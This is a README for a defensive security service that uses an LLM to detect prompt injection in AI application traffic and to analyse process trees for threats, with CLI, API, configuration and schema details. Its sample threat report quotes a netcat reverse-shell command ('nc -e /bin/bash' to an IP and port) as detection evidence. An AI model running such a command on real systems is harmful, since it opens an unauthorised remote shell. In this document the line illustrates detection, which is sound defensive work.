# Security Insight

Security Insight is a unified security analysis service providing two core functionalities:

1. **Prompt Injection Detection** - Real-time detection of malicious prompt injection attacks in LLM applications
2. **Threat Insight Analysis** - Deep threat analysis based on process tree behavior

## Architecture

```
Security Insight Service
├── Prompt Injection Detection (Real-time)
│   ├── LLM-based classification model
│   ├── Batch processing
│   └── Results stored in prompt_injection_results table
│
└── Threat Insight Analysis (Post-hoc)
    ├── Full process tree context analysis
    ├── LLM-driven semantic understanding
    └── Results stored in security_analysis_results table
```

## Features

### Prompt Injection Detection

- **Real-time Detection**: Analyzes LLM prompts in HTTP requests to detect potential injection attacks
- **Smart Extraction**: Automatically extracts user prompts from agent framework wrappers
- **Multi-mode Support**: 
  - `prompt_based`: Classification based on prompt content
  - `model_based`: Detection based on model behavior
- **Batch Optimization**: Efficiently processes large volumes of prompts
- **Sampling Control**: Configurable sampling rate to balance cost and coverage
- **QPS Limiting**: Built-in rate limiting to protect downstream LLM services

### Threat Insight Analysis

- **Deep Analysis**: Behavioral analysis based on complete process trees
- **Multi-dimensional Assessment**: 
  - Threat Level (0-2: Safe/Medium/Critical)
  - Threat Type Identification
  - Confidence Scoring
- **Context Understanding**: Combines process events and heuristic alerts
- **Actionable Recommendations**: Provides specific security response suggestions
- **Evidence Chain**: Detailed threat evidence and analysis details

## Usage

### 1. CLI Tool

Security Insight CLI uses a subcommand structure supporting two analysis modes:

```bash
securityinsight <command> [options]
```

Available commands:
- `prompt` - Prompt injection detection
- `threat` - Threat insight analysis
- `help` - Show help message

#### Prompt Injection Detection Subcommand

```bash
securityinsight prompt \
  --pg-dsn="postgres://user:pass@localhost:5432/watchu" \
  --host="api-server-1" \
  --since="2024-01-01T00:00:00Z" \
  --until="2024-01-02T00:00:00Z" \
  --base-url="http://localhost:4000/" \
  --api-key="dummy" \
  --model="gpt-4o" \
  --verbose
```

**Parameters**:
- `--pg-dsn`: PostgreSQL connection string (required)
- `--host`: Host to analyze (required)
- `--since`: Start time in RFC3339 format (required)
- `--until`: End time in RFC3339 format (required)
- `--base-url`: LLM API base URL (default: OPENAI_BASE_URL env variable)
- `--api-key`: LLM API key (default: OPENAI_API_KEY env variable)
- `--model`: Model name to use (default: gpt-4o)
- `--timeout`: API timeout (default: 120s)
- `--verbose`: Verbose output

#### Threat Insight Analysis Subcommand

```bash
securityinsight threat \
  --pg-dsn="postgres://user:pass@localhost:5432/watchu" \
  --root-exec-id="c9a8f5c7-4d3e-11ef-a1b2-0242ac120002" \
  --base-url="http://localhost:4000/" \
  --api-key="dummy" \
  --model="gpt-4o" \
  --save \
  --verbose
```

**Parameters**:
- `--pg-dsn`: PostgreSQL connection string (required)
- `--root-exec-id`: Root execution ID to analyze (required)
- `--save`: Save analysis result to database (default: true)
- `--base-url`: LLM API base URL (default: OPENAI_BASE_URL env variable)
- `--api-key`: LLM API key (default: OPENAI_API_KEY env variable)
- `--model`: Model name to use (default: gpt-4o)
- `--timeout`: API timeout (default: 120s)
- `--verbose`: Verbose output

**Exit Codes**:
- `0`: Safe (Threat Level = 0)
- `1`: Low/Medium threat (Threat Level = 1)
- `2`: Critical threat (Threat Level = 2)

### 2. Gateway HTTP API

#### Threat Insight Analysis Endpoint

```bash
POST /api/v1/security-insight/analyze-threat
Content-Type: application/json

{
  "root_exec_id": "c9a8f5c7-4d3e-11ef-a1b2-0242ac120002"
}
```

**Response Example**:

```json
{
  "root_exec_id": "c9a8f5c7-4d3e-11ef-a1b2-0242ac120002",
  "threat_level": 2,
  "threat_type": "Reverse Shell",
  "confidence": 0.95,
  "summary": "Detected reverse shell connection to external IP",
  "details": "The process tree shows bash executing nc command...",
  "recommendations": [
    "Immediately isolate the affected host",
    "Review network logs for data exfiltration",
    "Scan for additional backdoors"
  ],
  "evidence": [
    {
      "type": "process",
      "process_name": "nc",
      "arguments": "-e /bin/bash 192.168.1.100 4444",
      "severity": "critical"
    }
  ]
}
```

## Environment Variables

### Prompt Injection Detection

| Variable | Description | Default |
|----------|-------------|---------|
| `PROMPT_INJECTION_ENABLED` | Enable prompt injection detection | `true` |
| `PROMPT_INJECTION_API_BASE` | LLM API base URL | `https://api.openai.com/v1` |
| `PROMPT_INJECTION_API_KEY` | LLM API key | - |
| `PROMPT_INJECTION_MODEL` | Model name | `gpt-4o` |
| `PROMPT_INJECTION_MODE` | Detection mode | `prompt_based` |
| `PROMPT_INJECTION_TIMEOUT` | API timeout | `15s` |
| `PROMPT_INJECTION_BATCH_SIZE` | Batch size | `10` |
| `PROMPT_INJECTION_MAX_RETRIES` | Max retries | `3` |
| `PROMPT_INJECTION_SAMPLE_RATE` | Sampling rate (0-1) | `1.0` |
| `PROMPT_INJECTION_MAX_QPS` | Max QPS | `10.0` |
| `PROMPT_INJECTION_MAX_PROMPT_LEN` | Max prompt length | `8192` |
| `PROMPT_INJECTION_STRIP_TOOLS` | Strip tool calls | `true` |
| `PROMPT_INJECTION_EXTRACT_USER` | Extract user prompt | `true` |

### Threat Insight Analysis

| Variable | Description | Default |
|----------|-------------|---------|
| `THREAT_INSIGHT_BASE_URL` | LLM API base URL | `OPENAI_BASE_URL` |
| `THREAT_INSIGHT_API_KEY` | LLM API key | `OPENAI_API_KEY` |
| `THREAT_INSIGHT_MODEL` | Model name | `gpt-4o` |
| `THREAT_INSIGHT_TIMEOUT` | API timeout | `120s` |

**Note**: Threat Insight will prioritize `THREAT_INSIGHT_*` environment variables, falling back to `OPENAI_*` variables if not set.

## Docker Compose Configuration

```yaml
services:
  gateway:
    environment:
      # Prompt Injection Detection
      PROMPT_INJECTION_ENABLED: "true"
      PROMPT_INJECTION_API_BASE: "http://localhost:4000/"
      PROMPT_INJECTION_API_KEY: "dummy"
      PROMPT_INJECTION_MODEL: "github_copilot/gpt-4o"
      PROMPT_INJECTION_MODE: "prompt_based"
      PROMPT_INJECTION_TIMEOUT: "15s"
      PROMPT_INJECTION_BATCH_SIZE: "10"
      PROMPT_INJECTION_MAX_RETRIES: "3"
      PROMPT_INJECTION_SAMPLE_RATE: "1.0"
      PROMPT_INJECTION_MAX_QPS: "10.0"
      PROMPT_INJECTION_MAX_PROMPT_LEN: "8192"
      PROMPT_INJECTION_STRIP_TOOLS: "true"
      PROMPT_INJECTION_EXTRACT_USER: "true"
      
      # Threat Insight Analysis
      THREAT_INSIGHT_BASE_URL: "http://localhost:4000/"
      THREAT_INSIGHT_API_KEY: "dummy"
      THREAT_INSIGHT_MODEL: "github_copilot/gpt-4o"
      THREAT_INSIGHT_TIMEOUT: "120s"
```

## Database Schema

### prompt_injection_results

Stores prompt injection detection results:

```sql
CREATE TABLE prompt_injection_results (
    id BIGSERIAL PRIMARY KEY,
    request_id TEXT NOT NULL,
    host TEXT,
    prompt_hash TEXT,
    severity TEXT,
    score FLOAT,
    categories TEXT[],
    raw_response TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);
```

### security_analysis_results

Stores threat insight analysis results:

```sql
CREATE TABLE security_analysis_results (
    id BIGSERIAL PRIMARY KEY,
    host TEXT,
    root_exec_id TEXT NOT NULL,
    threat_level INT,
    threat_type TEXT,
    confidence FLOAT,
    summary TEXT,
    details TEXT,
    recommendations JSONB,
    evidence JSONB,
    created_at TIMESTAMPTZ DEFAULT NOW()
);
```

## Best Practices

### Prompt Injection Detection

1. **Sampling Strategy**: In production, adjust `PROMPT_INJECTION_SAMPLE_RATE` based on traffic and cost
2. **QPS Control**: Set reasonable `PROMPT_INJECTION_MAX_QPS` to avoid overwhelming LLM services
3. **Regular Review**: Periodically check false positives/negatives and adjust detection thresholds
4. **Alert Integration**: Integrate high-risk detection results into security alert systems

### Threat Insight Analysis

1. **Async Analysis**: Use background tasks for threat analysis to avoid blocking main processes
2. **Result Caching**: Cache analysis results for the same root_exec_id
3. **Context Enrichment**: Ensure sufficient process context data is collected
4. **Response Workflow**: Establish automated response workflows based on threat levels

## Troubleshooting

### Prompt Injection Detection Not Working

1. Check if `PROMPT_INJECTION_ENABLED` is set to `true`
2. Verify `PROMPT_INJECTION_API_BASE` and `PROMPT_INJECTION_API_KEY` configuration
3. Review error messages in logs
4. Check database for pending candidates

### Threat Insight Analysis Failures

1. Confirm `THREAT_INSIGHT_BASE_URL` or `OPENAI_BASE_URL` is set
2. Verify LLM API key is valid
3. Check if root_exec_id has corresponding event data
4. Review if LLM API responses are timing out (adjust `THREAT_INSIGHT_TIMEOUT`)

## Security Considerations

1. **API Key Protection**: Use environment variables or key management services to store LLM API keys
2. **Data Privacy**: Be aware that LLM analysis may involve sensitive data; consider using locally deployed models
3. **Access Control**: Restrict access to threat analysis APIs
4. **Audit Logging**: Record audit logs for all security analysis operations

## Performance Optimization

1. **Batch Processing**: Prompt Injection Detection uses batch processing for efficiency
2. **Concurrency Control**: Use QPS limits and timeouts to control concurrent requests
3. **Index Optimization**: Create indexes on `root_exec_id` and `host` fields
4. **Result Caching**: Use caching mechanisms for duplicate analysis requests
